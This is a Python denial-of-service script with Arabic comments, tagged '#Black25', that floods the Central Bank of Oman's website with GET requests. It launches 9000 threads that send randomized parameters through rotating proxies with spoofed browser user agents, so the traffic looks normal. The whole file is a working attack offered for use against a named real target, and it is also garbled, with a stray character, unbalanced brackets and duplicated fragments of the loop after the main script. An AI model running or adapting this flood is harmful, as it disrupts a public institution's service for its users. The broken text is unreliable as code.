      #Black25
import threading
import requests
import random
import string
import time

# عنوان URL المستهدف
target_url = "https://cbo.gov.om/ar/Pages/CBOHome.aspx"        # 👈 الموقع هنا

# قائمة بعناوين الوكلاء (يجب أن تكون عناوين وكلاء حقيقية)
proxies_list = [
    'http://192.168.1.1:8080',
   'http://51.158.68.133:8811', 
   'http://178.128.163.157:3128', ط
    'http://192.168.1.2:8080',
    'http://192.168.1.3:8080',
    'http://192.168.1.4:8080',
    # إضافة المزيد من الوكلاء الحقيقيين هنا
]

# إنشاء بيانات عشوائية لإرسالها كمعاملات GET
def random_string(length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

# إنشاء رأس HTTP واقعي
def random_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh؛ Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0؛ Win64؛ x64؛ rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone؛ CPU iPhone OS 14_6 مثل Mac OS X) AppleWebKit/605.1.15 (KHTML، مثل Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        # إضافة المزيد من وكلاء المستخدم هنا
    ]
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    return headers

# دالة لتنفيذ طلب HTTP GET مع معاملات عشوائية ورؤوس وكيلة
def perform_attack():
    try:
        while True:
            params = {random_string(): random_string() for _ in range(5)}  # إنشاء 5 معاملات عشوائية
            proxy = {'http': random.choice(proxies_list)}
            headers = random_headers()
            response = requests.get(target_url, params=params, proxies=proxy, headers=headers)
            print(f"Request sent: {response.status_code}, Params: {params}, Proxy: {proxy['http']}, Headers: {headers['User-Agent']}")
            time.sleep(random.uniform(0.05, 0.2))  # إضافة تأخير عشوائي لتقليل الحمل وجعل الطلبات تبدو طبيعية
    except Exception as e:
        print(f"Error: {e}")

# عدد مؤشرات الترابط (Threads) للهجوم
num_threads = 9000             #👈الطلبات  عدد
# إنشاء وإطلاق مؤشرات الترابط
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=perform_attack)
    thread.start()
    threads.append(thread)

# الانضمام إلى مؤشرات الترابط (اختياري)
for thread in threads:
    thread.join()
)





















, proxies=proxy, headers=headers)
            print(f"Request sent: {response.status_code}, Params: {params}, Proxy: {proxy['http']}, Headers: {headers['User-Agent']}")
            time.sleep(random.uniform(0.05, 0.2))  # إضافة تأخير عشوائي لتقليل الحمل وجعل الطلبات تبدو طبيعية
    except Exception as e:
        print(f"Error: {e}")

# عدد مؤشرات الترابط (Threads) للهجوم
num_threads = 9000             #👈الطلبات  عدد
# إنشاء وإطلاق مؤشرات الترابط
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=perform_attack)
    thread.start()
    threads.append(thread)

# الانضمام إلى مؤشرات الترابط (اختياري)
for thread in threads:
    thread.join()






thread.join()














()














